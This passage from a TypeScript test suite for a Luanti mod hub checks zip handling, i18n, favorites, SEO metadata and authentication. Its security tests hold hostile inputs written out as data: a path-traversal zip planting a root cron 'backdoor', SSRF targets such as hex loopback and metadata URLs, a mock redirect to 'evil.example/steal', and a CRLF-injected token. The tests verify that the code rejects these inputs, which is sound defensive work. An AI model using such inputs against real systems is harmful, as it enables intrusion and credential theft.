      'repo-main/init.lua': '-- ok\n',
      'repo-main/../../etc/cron.d/backdoor': '* * * * * root evil\n',
      '../outside.lua': 'os.execute("evil")\n'
    });
    const normalizedZip = normalizeLuantiPackageZip(maliciousZip, 'safe_mod', 'mod');
    const extractedEntries = listZipCentralDirPaths(normalizedZip);
    expect(extractedEntries.some(p => p.includes('..') || p.includes('backdoor') || p.includes('outside.lua'))).toBe(false);
    expect(extractedEntries).toContain('safe_mod/mod.conf');
    expect(extractedEntries).toContain('safe_mod/init.lua');

    const dotSlashZip = buildStoredZip({
      './repo-main/mod.conf': 'name = dot_mod\n',
      'repo-main//init.lua': '-- safe init\n'
    });
    const normalizedDotSlash = normalizeLuantiPackageZip(dotSlashZip, 'dot_mod', 'mod');
    const dotSlashEntries = listZipCentralDirPaths(normalizedDotSlash);
    expect(dotSlashEntries).toContain('dot_mod/mod.conf');
    expect(dotSlashEntries).toContain('dot_mod/init.lua');
  });

  it('should reset modal transient state on package switch, preserve $& in translations, reconcile concurrent favorites, and keep DRY config utilities in parity', async () => {
    const {
      detectSpdxFromLicenseText,
      parseLuantiConf,
      stripAuthorForgeSuffix
    } = await import('./core/config/package-utils.config');

    // 1. Shared DRY utility parity
    expect(stripAuthorForgeSuffix('sakel-github')).toBe('sakel');
    expect(stripAuthorForgeSuffix('Wuzzy-codeberg')).toBe('Wuzzy');
    expect(detectSpdxFromLicenseText('Permission is hereby granted, free of charge, to any person obtaining a copy')).toBe('MIT');
    expect(detectSpdxFromLicenseText('GNU LESSER GENERAL PUBLIC LICENSE Version 2.1')).toBe('LGPL-2.1-only');
    const parsedConf = parseLuantiConf('name = test_mod\ndescription = """\nMulti-line\nconf text\n"""\ndepends = default, farming\n');
    expect(parsedConf['name']).toBe('test_mod');
    expect(parsedConf['description']).toBe('Multi-line\nconf text');
    expect(parsedConf['depends']).toBe('default, farming');

    // 2. TranslationService parameter replacement must not corrupt `$&` or `$$` replacement tokens
    const i18n = TestBed.inject(TranslationService);
    expect(i18n.translate('modal.filterByTagTooltip', { tag: 'Price $& $$100' })).toContain('Price $& $$100');

    // 3. SettingsService mergeServerFavorites preserves concurrent local toggles while server sync is in flight
    const settings = TestBed.inject(SettingsService);
    settings.toggleFavorite('Wuzzy/mineclone2'); // pending local add
    expect(settings.isFavorite('Wuzzy/mineclone2')).toBe(true);
    // Simulate stale server GET response arriving before POST /api/auth/favorites completes
    settings.mergeServerFavorites(['TenPlus1/farming']);
    expect(settings.isFavorite('Wuzzy/mineclone2')).toBe(true);
    expect(settings.isFavorite('TenPlus1/farming')).toBe(true);

    // 4. PackageDetailModalComponent resets transient edit/report/review/releaseNotes state when switching from Package A to Package B
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modal = modalFixture.componentInstance;
    const pkgA: LuantiPackage = {
      id: 'AuthorA/mod_a',
      author: 'AuthorA',
      name: 'mod_a',
      title: 'Mod A',
      type: 'mod',
      short_desc: 'First mod',
      thumbnail: 'logo.svg',
      banner: 'logo.svg',
      score: 5,
      downloads: 100,
      license: 'MIT',
      media_license: 'CC0-1.0',
      min_minetest_version: '5.0.0',
      source: 'official',
      tags: ['mod']
    };
    const pkgB: LuantiPackage = {
      ...pkgA,
      id: 'AuthorB/mod_b',
      author: 'AuthorB',
      name: 'mod_b',
      title: 'Mod B'
    };

    modal.package = pkgA;
    modal.ngOnInit();
    modal.isEditingTags.set(true);
    modal.isReportOpen.set(true);
    modal.reportDetails = 'Broken link on Mod A';
    modal.isConfirmingRemove.set(true);
    modal.reviewTitle = 'Draft review for A';
    modal.reviewComment = 'Draft comment for A';
    modal.releaseNotesByKey.set(new Map([['rel-1', { commits: [], totalCommits: 1 } as any]]));

    modal.package = pkgB;
    modal.ngOnChanges();

    expect(modal.isEditingTags()).toBe(false);
    expect(modal.isReportOpen()).toBe(false);
    expect(modal.reportDetails).toBe('');
    expect(modal.isConfirmingRemove()).toBe(false);
    expect(modal.reviewTitle).toBe('');
    expect(modal.reviewComment).toBe('');
    expect(modal.releaseNotesByKey().size).toBe(0);
  });

  it('should enforce post-audit review fixes across tunnel detection, SSRF host validation, lazy i18n reactivity, guest favorites, and custom-forge submission', async () => {
    const { detectInboundEphemeralTunnelHeader } = await import('../../functions/_middleware');
    const { isUntrustedTunnelOrPrivateHost } = await import('./core/config/git-providers.config');
    const { classifyCandidateGitRepoUrl } = await import('../../functions/api/lib/author-git-sync');
    const { TranslatePipe } = await import('./core/i18n/translate.pipe');

    // 1. Tunnel header detector ignores query strings on legitimate origins while blocking tunnel origins
    const legitSearchReq = new Request('https://luantihub.org/api/packages', {
      headers: { Referer: 'https://luantihub.org/?q=playit.gg' }
    });
    expect(detectInboundEphemeralTunnelHeader(legitSearchReq)).toBeNull();

    const evilTunnelReq = new Request('https://luantihub.org/api/packages/git', {
      method: 'POST',
      headers: { Origin: 'https://attacker.trycloudflare.com' }
    });
    expect(detectInboundEphemeralTunnelHeader(evilTunnelReq)).not.toBeNull();

    // 2. SSRF host validator & custom Git classifier allow hex-prefixed public domains (git.0x7be.net) while blocking internal/hex IPs
    expect(isUntrustedTunnelOrPrivateHost('https://git.0x7be.net/dirk/mymod')).toBe(false);
    expect(isUntrustedTunnelOrPrivateHost('http://0x7f000001/latest/meta-data')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('http://metadata/computeMetadata/v1')).toBe(true);
    expect(isUntrustedTunnelOrPrivateHost('not-a-valid-url')).toBe(true);

    const classifiedCustom = classifyCandidateGitRepoUrl('https://git.0x7be.net/dirk/mymod');
    expect(classifiedCustom).not.toBeNull();
    expect(classifiedCustom?.provider).toBe('custom');

    // 3. TranslatePipe invalidates cached translation once lazy locale dictionary finishes loading
    const i18n = TestBed.inject(TranslationService);
    const pipe = TestBed.runInInjectionContext(() => new TranslatePipe());
    i18n.setLocale('sk');
    await i18n.ensureLocaleLoaded('sk');
    const translatedSk = pipe.transform('header.submitGit');
    expect(typeof translatedSk).toBe('string');
    expect(translatedSk.length).toBeGreaterThan(0);
    i18n.setLocale('en');

    // 5. Guest add+remove before login must not tombstone server favorites on mergeServerFavorites
    const settings = TestBed.inject(SettingsService);
    settings.isAuthenticatedSession.set(false);
    settings.favorites.set([]);
    settings.clearPendingFavoriteOps();
    settings.toggleFavorite('Wuzzy/mineclone2'); // guest add
    settings.toggleFavorite('Wuzzy/mineclone2'); // guest remove
    expect(settings.isFavorite('Wuzzy/mineclone2')).toBe(false);
    // User logs in and server reports Wuzzy/mineclone2 is saved on their account:
    settings.mergeServerFavorites(['Wuzzy/mineclone2']);
    expect(settings.isFavorite('Wuzzy/mineclone2')).toBe(true);

    // 6. SubmitModalComponent classifies custom git host as 'custom' and passes requestAdminClaim on publish
    const authService = TestBed.inject(AuthService);
    const pkgService = TestBed.inject(PackageService);
    (authService as any)._currentUser.set({
      id: 'usr_custom',
      username: 'dirk',
      avatar_url: 'logo.svg',
      identities: [{ provider: 'codeberg', username: 'dirk', verified: true }]
    });
    const submitFixture = TestBed.createComponent(SubmitModalComponent);
    const submitComp = submitFixture.componentInstance;
    submitComp.repoUrl = 'https://git.0x7be.net/dirk/mymod';
    submitComp.onUrlChange();
    expect(submitComp.parsedRepoTarget()?.provider).toBe('custom');
    expect(submitComp.supportsDirectOwnerAuth(submitComp.parsedRepoTarget()?.provider)).toBe(false);

    submitComp.warrantyOwnership = true;
    submitComp.warrantyAssets = true;
    submitComp.warrantyTakedown = true;
    submitComp.auditReport.set({
      valid: true,
      auditToken: 'tok_custom_123',
      ownershipVerified: false,
      pendingAdminClaim: true,
      configFound: 'mod.conf',
      luacheckPassed: true,
      licenseValid: true,
      diagnostics: []
    });
    expect(submitComp.canPublish()).toBe(true);

    const submitSpy = vi.spyOn(pkgService, 'auditOrSubmitGitPackage').mockResolvedValue({
      success: true,
      pendingModeration: true,
      message: 'Queued for admin claim review.'
    });
    await submitComp.onPublish();
    expect(submitSpy).toHaveBeenCalledWith(expect.objectContaining({
      repoUrl: 'https://git.0x7be.net/dirk/mymod',
      dryRun: false,
      requestAdminClaim: true
    }));
  });

  it('enforces brand-first SEO metadata, per-route hreflang & self-canonical ?lang, scoped FAQPage schema, 301 /packages/ redirect, 0-review AggregateRating guard, real 404s, and single H1 hierarchy', async () => {
    const { onRequest: edgeMw } = await import('../../functions/_middleware');
    const { onRequestGet: packageSsrGet } = await import('../../functions/package/[author]/[name]');
    const { onRequestGet: pluralPackagesGet } = await import('../../functions/packages/[author]/[name]/index');
    const { onRequestGet: authorSsrGet } = await import('../../functions/author/[username]');
    const sitemapMod = await import('../../functions/sitemap.xml');

    const richShellHtml = `<!doctype html><html lang="en" class="dark"><head><title>Luanti Hub (LuantiHub) — Mods, Games &amp; Texture Packs for Luanti</title><meta name="description" content="Default" /><meta name="keywords" content="luanti hub, luantihub" /><link rel="canonical" id="canonical-link" href="https://luantihub.org/" /><link rel="alternate" hreflang="x-default" href="https://luantihub.org/" /><link rel="alternate" hreflang="en" href="https://luantihub.org/" /><link rel="alternate" hreflang="de" href="https://luantihub.org/?lang=de" /><meta property="og:title" content="Default" /><meta property="og:description" content="Default" /><meta property="og:url" content="https://luantihub.org/" /><meta property="og:image" content="https://luantihub.org/screenshot-desktop.png" /><meta property="og:locale" content="en_US" /><meta name="twitter:title" content="Default" /><meta name="twitter:description" content="Default" /><meta name="twitter:image" content="https://luantihub.org/screenshot-desktop.png" /><script type="application/ld+json" id="home-faq-jsonld">{"@type":"FAQPage"}</script></head><body><h1>Home</h1><main class="sr-only"></main></body></html>`;

    // 1. Plural /packages/:author/:name 301-redirects to canonical singular /package/:author/:name
    const pluralRes = await pluralPackagesGet({
      request: new Request('https://luantihub.org/packages/SaKeL/everness?utm_source=cdb'),
      params: { author: 'SaKeL', name: 'everness' }
    });
    expect(pluralRes.status).toBe(301);
    expect(pluralRes.headers.get('Location')).toBe('https://luantihub.org/package/SaKeL/everness?utm_source=cdb');

    // 2. Section hub (/mods) rewrites hreflang to /mods (never leaking homepage /?lang=...), strips #home-faq-jsonld, and supports self-canonical ?lang=de
    const modsDeRes = await edgeMw({
      request: new Request('https://luantihub.org/mods?lang=de', { method: 'GET' }),
      next: async () =>
        new Response(richShellHtml, {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8' }
        }),
      env: {}
    });
    expect(modsDeRes.status).toBe(200);
    const modsDeHtml = await modsDeRes.text();
    expect(modsDeHtml).toContain('<html lang="de"');
    expect(modsDeHtml).toContain('<link rel="canonical" id="canonical-link" href="https://luantihub.org/mods?lang=de" />');
    expect(modsDeHtml).toContain('hreflang="x-default" href="https://luantihub.org/mods"');
    expect(modsDeHtml).toContain('hreflang="en" href="https://luantihub.org/mods"');
    expect(modsDeHtml).toContain('hreflang="de" href="https://luantihub.org/mods?lang=de"');
    expect(modsDeHtml).not.toContain('href="https://luantihub.org/?lang=de"');
    expect(modsDeHtml).not.toContain('id="home-faq-jsonld"');

    // 3. Localized homepage (/?lang=sk) emits <html lang="sk">, self-referencing canonical, and Slovak metadata while keeping #home-faq-jsonld
    const homeSkRes = await edgeMw({
      request: new Request('https://luantihub.org/?lang=sk', { method: 'GET' }),
      next: async () =>
        new Response(richShellHtml, {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8' }
        }),
      env: {}
    });
    const homeSkHtml = await homeSkRes.text();
    expect(homeSkHtml).toContain('<html lang="sk"');
    expect(homeSkHtml).toContain('<link rel="canonical" id="canonical-link" href="https://luantihub.org/?lang=sk" />');
    expect(homeSkHtml).toContain('og:locale" content="sk_SK"');
    expect(homeSkHtml).toContain('id="home-faq-jsonld"');

    // 4. Unknown non-SPA paths hitting Edge middleware return real HTTP 404 with noindex instead of 200 Soft-404
    const unknownRes = await edgeMw({
      request: new Request('https://luantihub.org/nonexistent-random-page', { method: 'GET' }),
      next: async () => new Response('Not Found', { status: 404 }),
      env: {
        ASSETS: {
          fetch: async () => new Response(richShellHtml, { status: 200 })
        }
      }
    });
    expect(unknownRes.status).toBe(404);
    expect(unknownRes.headers.get('X-Robots-Tag')).toBe('noindex');

    // 5. Package & Author SSR strip homepage hreflang & #home-faq-jsonld, and Package SSR omits AggregateRating when review count is 0
    const zeroReviewPkgRes = await packageSsrGet({
      request: new Request('https://luantihub.org/package/ZeroRevAuthor/zero_rev_mod'),
      params: { author: 'ZeroRevAuthor', name: 'zero_rev_mod' },
      env: {
        ASSETS: {
          fetch: async () => new Response(richShellHtml, { status: 200 })
        },
        DB: {
          prepare: (sql: string) => ({
            bind: () => ({
              first: async () =>
                sql.includes('FROM packages')
                  ? {
                      title: 'Zero Rev Mod',
                      author_name: 'ZeroRevAuthor',
                      name: 'zero_rev_mod',
                      provider: 'github',
                      short_desc: 'Brand new mod with zero reviews',
                      type: 'mod',
                      license: 'MIT',
                      score: 4.5,
                      downloads_count: 10
                    }
                  : { avg_rating: null, cnt: 0 }
            })
          })
        }
      }
    });
    const zeroReviewHtml = await zeroReviewPkgRes.text();
    expect(zeroReviewHtml).not.toContain('hreflang=');
    expect(zeroReviewHtml).not.toContain('id="home-faq-jsonld"');
    expect(zeroReviewHtml).not.toContain('AggregateRating');

    const authorCleanRes = await authorSsrGet({
      request: new Request('https://luantihub.org/author/SaKeL'),
      params: { username: 'SaKeL' },
      env: {
        ASSETS: {
          fetch: async () => new Response(richShellHtml, { status: 200 })
        }
      }
    });
    const authorCleanHtml = await authorCleanRes.text();
    expect(authorCleanHtml).not.toContain('hreflang=');
    expect(authorCleanHtml).not.toContain('id="home-faq-jsonld"');

    // 6. Sitemap uses clean URL for hreflang="en" (no ?lang=en duplicate) while keeping ?lang=de, ?lang=sk, etc.
    const smRes = await sitemapMod.onRequestGet({
      request: new Request('https://luantihub.org/sitemap.xml', { method: 'GET' }),
      env: {}
    });
    const smXml = await smRes.text();
    expect(smXml).toContain('hreflang="en" href="https://luantihub.org/"');
    expect(smXml).not.toContain('?lang=en');
    expect(smXml).toContain('hreflang="de" href="https://luantihub.org/?lang=de"');

    // 7. Single H1 hierarchy: HeaderComponent uses <span> (0 <h1>), CatalogComponent uses <h1> on Home and downgrades to <h2> when modal/author overlay is open
    const headerFixture = TestBed.createComponent(HeaderComponent);
    headerFixture.detectChanges();
    expect(headerFixture.nativeElement.querySelectorAll('h1').length).toBe(0);
    headerFixture.destroy();

    const pkgService = TestBed.inject(PackageService);
    pkgService.closePackageModal();
    pkgService.closeAuthorDrawer();
    const catalogFixture = TestBed.createComponent(CatalogComponent);
    catalogFixture.detectChanges();
    expect(catalogFixture.nativeElement.querySelectorAll('h1').length).toBe(1);
    expect(catalogFixture.nativeElement.querySelector('h1')?.textContent).toContain('Luanti Hub (LuantiHub)');

    pkgService.openPackageModal({
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      type: 'mod',
      short_desc: 'Custom biomes',
      thumbnail: 'logo.svg',
      score: 5,
      downloads: 50000,
      license: 'LGPL-2.1-only',
      source: 'official',
      tags: ['biomes']
    });
    catalogFixture.detectChanges();
    expect(catalogFixture.nativeElement.querySelectorAll('h1').length).toBe(0);
    expect(catalogFixture.nativeElement.querySelector('h2#luanti-ecosystem-guide-heading')).toBeTruthy();
    pkgService.closePackageModal();
    catalogFixture.destroy();
  });

  it('prevents phantom ContentDB downloads & source badges on browser-tab SSR deep links and self-heals v14 localStorage', async () => {
    const { onRequestGet: packageSsrGet } = await import('../../functions/package/[author]/[name]');
    const shellHtml =
      '<!doctype html><html lang="en"><head><title>Luanti Hub</title><meta name="description" content="" /><meta name="keywords" content="" /><link rel="canonical" id="canonical-link" href="https://luantihub.org/" /><meta property="og:title" content="" /><meta property="og:description" content="" /><meta property="og:url" content="" /><meta property="og:image" content="" /><meta name="twitter:title" content="" /><meta name="twitter:description" content="" /><meta name="twitter:image" content="" /></head><body><app-root><main class="sr-only"></main></app-root></body></html>';

    // 1. Edge SSR for Git package emits exact split counters + Git provenance in __LUANTI_INITIAL_PACKAGE__
    const ssrRes = await packageSsrGet({
      request: new Request('https://luantihub.org/package/sakel-hub/terrarium_crucible'),
      params: { author: 'sakel-hub', name: 'terrarium_crucible' },
      env: {
        ASSETS: { fetch: async () => new Response(shellHtml, { status: 200 }) },
        DB: {
          prepare: (sql: string) => ({
            bind: () => ({
              first: async () =>
                sql.includes('SELECT status FROM packages')
                  ? { status: 'active' }
                  : sql.includes('FROM packages')
                    ? {
                        id: 'sakel-hub/terrarium_crucible',
                        author_name: 'sakel-hub',
                        name: 'terrarium_crucible',
                        title: 'Terrarium Crucible',
                        provider: 'github',
                        short_desc: 'Action-puzzle gardening game for the 2026 Luanti Game Jam.',
                        long_desc: 'Full README description',
                        type: 'game',
                        license: 'MIT',
                        contentdb_downloads: 0,
                        luantihub_downloads: 1,
                        downloads_count: 1,
                        tags: '["git","github","game","jam_game_2026"]'
                      }
                    : { avg_rating: null, cnt: 0 }
            })
          })
        }
      }
    });
    expect(ssrRes.status).toBe(200);
    const ssrHtml = await ssrRes.text();
    const seedMatch = ssrHtml.match(/window\.__LUANTI_INITIAL_PACKAGE__=(\{.*?\});<\/script>/);
    expect(seedMatch).toBeTruthy();
    const parsedSsrSeed = JSON.parse(seedMatch![1]);
    expect(parsedSsrSeed.contentdb_downloads).toBe(0);
    expect(parsedSsrSeed.luantihub_downloads).toBe(1);
    expect(parsedSsrSeed.downloads).toBe(1);
    expect(parsedSsrSeed.provider).toBe('github');
    expect(parsedSsrSeed.source).toBe('git');
    expect(parsedSsrSeed.sources).toEqual(['git']);

    // 2. Self-heals poisoned lh_hydrated_meta_v14 in localStorage on reload while preserving Hub downloads
    const pkgService = TestBed.inject(PackageService);
    localStorage.removeItem('lh_hydrated_meta_v15');
    localStorage.setItem(
      'lh_hydrated_meta_v14',
      JSON.stringify({
        'sakel-hub/terrarium_crucible': {
          contentdb_downloads: 1,
          luantihub_downloads: 1,
          downloads: 2,
          sources: ['official', 'git'],
          tags: ['git', 'game', 'jam_game_2026']
        }
      })
    );
    (pkgService as any).hydratedMetaCache.clear();
    (pkgService as any).loadHydratedMetaCache();
    expect(localStorage.getItem('lh_hydrated_meta_v14')).toBeNull();
    const healedCached = (pkgService as any).hydratedMetaCache.get('sakel-hub/terrarium_crucible');
    expect(healedCached?.contentdb_downloads).toBeUndefined();
    expect(healedCached?.luantihub_downloads).toBe(1);
    expect(healedCached?.downloads).toBe(1);
    expect(healedCached?.sources).toEqual(['git']);

    // 3. Even if a stale CDN edge serves legacy unsplit __LUANTI_INITIAL_PACKAGE__ ({ downloads: 1 }),
    // cold browser-tab deep-link boot + API hydration resolves ContentDB: 0, Hub: 1, Total: 1, sources: ['git']
    const origFetch = globalThis.fetch;
    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (url.includes('/api/packages/sakel-hub/terrarium_crucible')) {
        return new Response(
          JSON.stringify({
            id: 'sakel-hub/terrarium_crucible',
            author: 'sakel-hub',
            author_display_name: 'SaKeL',
            name: 'terrarium_crucible',
            title: 'Terrarium Crucible',
            type: 'game',
            provider: 'github',
            source: 'git',
            sources: ['git'],
            repo_url: 'https://github.com/SaKeL/terrarium_crucible',
            license: 'MIT',
            contentdb_downloads: 0,
            luantihub_downloads: 1,
            downloads: 1,
            tags: ['git', 'game', 'jam_game_2026'],
            badge_tags: ['jam_game_2026'],
            releases: [],
            reviews_list: []
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('{}', { status: 404 });
    }) as any;

    try {
      (pkgService as any).edgeApiAvailable = true;
      (pkgService as any).initialUrlSynced = false;
      (pkgService as any)._packages.set([]);
      (pkgService as any)._activePackage.set(null);
      (pkgService as any).deepHydratedIds.clear();
      (window as any).__LUANTI_INITIAL_PACKAGE__ = {
        author: 'sakel-hub',
        name: 'terrarium_crucible',
        title: 'Terrarium Crucible',
        type: 'game',
        downloads: 1
      };

      (pkgService as any).syncStateFromUrl('/package/sakel-hub/terrarium_crucible');
      expect(pkgService.activePackage()?.contentdb_downloads).toBe(0);
      expect(pkgService.activePackage()?.sources).toEqual(['git']);

      (pkgService as any).applyBootPayload({
        packages: [
          {
            id: 'sakel-hub/terrarium_crucible',
            author: 'sakel-hub',
            name: 'terrarium_crucible',
            title: 'Terrarium Crucible',
            type: 'game',
            provider: 'github',
            source: 'git',
            sources: ['git'],
            contentdb_downloads: 0,
            luantihub_downloads: 1,
            downloads: 1,
            tags: ['git', 'game', 'jam_game_2026']
          }
        ]
      });

      await new Promise(resolve => setTimeout(resolve, 30));

      const active = pkgService.activePackage();
      expect(active?.contentdb_downloads).toBe(0);
      expect(active?.luantihub_downloads).toBe(1);
      expect(active?.downloads).toBe(1);
      expect(active?.sources).toEqual(['git']);

      // 4. ensureRecentlyAddedLoaded() does not copy aggregated detail.downloads into contentdb_downloads on ?lite=1
      globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
        const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
        if (url.includes('sort=approved_at')) {
          return new Response(
            JSON.stringify([
              {
                author: 'SaKeL',
                name: 'terrarium_crucible',
                title: 'Terrarium Crucible',
                type: 'game',
                short_desc: 'Action-puzzle gardening game'
              }
            ]),
            { status: 200, headers: { 'Content-Type': 'application/json' } }
          );
        }
        if (url.includes('terrarium_crucible')) {
          return new Response(
            JSON.stringify({
              id: 'SaKeL/terrarium_crucible',
              author: 'SaKeL',
              name: 'terrarium_crucible',
              contentdb_downloads: 0,
              luantihub_downloads: 1,
              downloads: 1,
              license: 'MIT',
              created_at: '2026-11-12T00:00:00Z'
            }),
            { status: 200, headers: { 'Content-Type': 'application/json' } }
          );
        }
        return new Response('{}', { status: 404 });
      }) as any;
      (pkgService as any).recentlyAddedInFlight = null;
      (pkgService as any).ensureRecentlyAddedLoaded(true);
      await (pkgService as any).recentlyAddedInFlight;
      const recentItem = (pkgService as any)._serverRecentlyAdded().find(
        (p: any) => p.name === 'terrarium_crucible' && p.author === 'SaKeL'
      );
      expect(recentItem?.contentdb_downloads).toBe(0);
      expect(recentItem?.luantihub_downloads).toBe(1);
      expect(recentItem?.downloads).toBe(1);
    } finally {
      globalThis.fetch = origFetch;
      pkgService.closePackageModal();
    }
  });

  it('should enforce zero-storage PAT security guarantees, reject write-scoped or mismatched tokens, block cross-provider username collision hijacking, rate-limit auth_verify, and wipe tokens from UI memory', async () => {
    const {
      verifyProviderToken,
      hasExcessiveTokenScopes,
      createSessionToken,
      verifySessionTokenClaims,
      createOAuthStateToken
    } = await import('../../functions/api/auth/lib/session');
    const { onRequestPost: onAuthMePost, onRequestPut: onAuthMePut } = await import('../../functions/api/auth/me');
    const { onRequestGet: oauthCallbackGet } = await import('../../functions/api/auth/[provider]/callback');
    const { onRequest: edgeMiddleware } = await import('../../functions/_middleware');
    const { AuthModalComponent } = await import('./features/auth/auth-modal.component');

    // 1. Scope ceiling helper unit checks
    expect(hasExcessiveTokenScopes(new Headers({ 'X-OAuth-Scopes': '' }), 'github')).toBe(false);
    expect(hasExcessiveTokenScopes(new Headers({ 'X-OAuth-Scopes': 'read:user, user:email' }), 'github')).toBe(false);
    expect(hasExcessiveTokenScopes(new Headers({ 'X-OAuth-Scopes': 'repo, read:user' }), 'github')).toBe(true);
    expect(hasExcessiveTokenScopes(new Headers({ 'X-Gitea-Scopes': 'read:user' }), 'codeberg')).toBe(false);
    expect(hasExcessiveTokenScopes(new Headers({ 'X-Gitea-Scopes': 'write:repository, read:user' }), 'codeberg')).toBe(true);

    const origFetch = globalThis.fetch;
    let fetchCalls = 0;
    const seenRedirects: Array<RequestRedirect | undefined> = [];

    try {
      // 2. Reject short / CRLF-injected tokens before any network call
      globalThis.fetch = (async () => {
        fetchCalls++;
        return new Response('{}', { status: 200 });
      }) as typeof fetch;

      const shortRes = await verifyProviderToken('github', 'short', 'alice');
      const crlfRes = await verifyProviderToken('github', 'ghp_validlength\r\nX-Injected: 1', 'alice');
      expect(shortRes).toEqual({ verified: false, failureReason: 'invalid_token' });
      expect(crlfRes).toEqual({ verified: false, failureReason: 'invalid_token' });
      expect(fetchCalls).toBe(0);

      // 3. Reject username mismatch, write-scoped PATs, and HTTP 302 redirects
      globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
        const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
        seenRedirects.push(init?.redirect);
        const authHdr = new Headers(init?.headers || {}).get('Authorization') || '';

        if (authHdr.includes('tok_redirect_302')) {
          return new Response(null, { status: 302, headers: { Location: 'https://evil.example/steal' } });
        }
        if (authHdr.includes('tok_write_repo')) {
          return new Response(JSON.stringify({ id: 101, login: 'alice' }), {
            status: 200,
            headers: { 'Content-Type': 'application/json', 'X-OAuth-Scopes': 'repo, workflow' }
          });
        }
        if (authHdr.includes('tok_bob_readonly')) {
          return new Response(JSON.stringify({ id: 202, login: 'bob' }), {
            status: 200,
            headers: { 'Content-Type': 'application/json', 'X-OAuth-Scopes': '' }
          });
        }
        if (url === 'https://codeberg.org/api/v1/user' && authHdr.includes('tok_cb_attacker_alice')) {
          return new Response(JSON.stringify({ id: 9001, login: 'alice', full_name: 'Codeberg Alice' }), {
            status: 200,
            headers: { 'Content-Type': 'application/json', 'X-Gitea-Scopes': 'read:user' }
          });
        }
        if (url === 'https://content.luanti.org/api/whoami/' && authHdr.includes('tok_cdb_victim_alice')) {
          return new Response(JSON.stringify({ is_authenticated: true, username: 'alice', display_name: 'Alice' }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
          });
        }
        if (url === 'https://gitlab.com/oauth/token') {
          return new Response(JSON.stringify({ access_token: 'gl_oauth_attacker_alice' }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
          });
        }
        if (url === 'https://gitlab.com/api/v4/user') {
          return new Response(JSON.stringify({ id: 7777, username: 'alice', name: 'GitLab Alice' }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
          });
        }
        return new Response('{}', { status: 401 });
      }) as typeof fetch;

      const redirCheck = await verifyProviderToken('github', 'tok_redirect_302_abcdef', 'alice');
      expect(redirCheck.verified).toBe(false);
      expect(redirCheck.failureReason).toBe('upstream_error');
      expect(seenRedirects[0]).toBe('error');

      const writeScopeRes = await onAuthMePost({
        request: new Request('https://luantihub.org/api/auth/me', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Origin: 'https://luantihub.org' },
          body: JSON.stringify({ provider: 'github', username: 'alice', token: 'tok_write_repo_abcdef' })
        }),
        env: { SESSION_SECRET: 'sec_pat_test_123456' }
      } as any);
      expect(writeScopeRes.status).toBe(400);
      expect(writeScopeRes.headers.get('Cache-Control')).toContain('no-store');
      const writeScopeJson = await writeScopeRes.json();
      expect(writeScopeJson.error).toContain('only accepts zero-scope / read-only tokens');

      const mismatchRes = await onAuthMePost({
        request: new Request('https://luantihub.org/api/auth/me', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Origin: 'https://luantihub.org' },
          body: JSON.stringify({ provider: 'github', username: 'alice', token: 'tok_bob_readonly_abcdef' })
        }),
        env: { SESSION_SECRET: 'sec_pat_test_123456' }
      } as any);
      expect(mismatchRes.status).toBe(401);
      const mismatchJson = await mismatchRes.json();
      expect(mismatchJson.error).toContain('different account than the username entered');

      // 4. Cross-Provider Username Collision Account Takeover Blocked (PAT + OAuth), while Authenticated Linking Works
      const usersTable: Array<{ id: string; username: string; display_name: string; avatar_url: string; role: string }> = [
        {
          id: 'usr_victim_alice',
          username: 'alice',
          display_name: 'Original Alice',
          avatar_url: 'https://github.com/alice.png',
          role: 'admin'
        }
      ];
      let nextIdentityId = 2;
      const identitiesTable: Array<{
        id: number;
        user_id: string;
        provider: string;
        provider_user_id: string;
        provider_username: string;
        profile_url: string;
        avatar_url: string;
        verified: number;
      }> = [
        {
          id: 1,
          user_id: 'usr_victim_alice',
          provider: 'github',
          provider_user_id: '101',
          provider_username: 'alice',
          profile_url: 'https://github.com/alice',
          avatar_url: 'https://github.com/alice.png',
          verified: 1
        }
      ];

      const mockCollisionDb = {
        prepare(sql: string) {
          const norm = sql.replace(/\s+/g, ' ').trim();
          return {
            bind(...args: any[]) {
              const execQuery = (): any[] => {
                if (/FROM users WHERE id = \?/i.test(norm)) {
                  return usersTable.filter(u => u.id === String(args[0]));
                }
                if (/FROM users WHERE LOWER\(username\) = LOWER\(\?\)\s*(AND id != \?)?/i.test(norm)) {
                  const targetU = String(args[0] || '').toLowerCase();
                  const exclId = args[1] ? String(args[1]) : null;
                  return usersTable.filter(
                    u => u.username.toLowerCase() === targetU && (!exclId || u.id !== exclId)
                  );
                }
                if (/FROM user_identities WHERE provider = \? AND \(provider_user_id = \? OR LOWER\(provider_username\) = LOWER\(\?\)\)/i.test(norm)) {
                  const prov = String(args[0] || '').toLowerCase();
                  const puid = String(args[1] || '');
                  const puname = String(args[2] || '').toLowerCase();
                  return identitiesTable.filter(
                    i =>
                      i.provider.toLowerCase() === prov &&
                      (i.provider_user_id === puid || i.provider_username.toLowerCase() === puname)
                  );
                }
                if (/FROM user_identities WHERE user_id = \? AND verified = 1/i.test(norm)) {
                  return identitiesTable.filter(i => i.user_id === String(args[0]) && i.verified === 1);
                }
                if (/FROM user_identities WHERE user_id = \? AND provider = \?/i.test(norm)) {
                  return identitiesTable.filter(
                    i => i.user_id === String(args[0]) && i.provider.toLowerCase() === String(args[1]).toLowerCase()
                  );
                }
                if (/FROM user_identities WHERE user_id = \?/i.test(norm)) {
                  return identitiesTable.filter(i => i.user_id === String(args[0]));
                }
                return [];
              };
              return {
                first: async () => execQuery()[0] ?? null,
                all: async () => ({ results: execQuery() }),
                run: async () => {
                  if (/INSERT INTO users/i.test(norm)) {
                    const [id, username, display_name, avatar_url, role] = args;
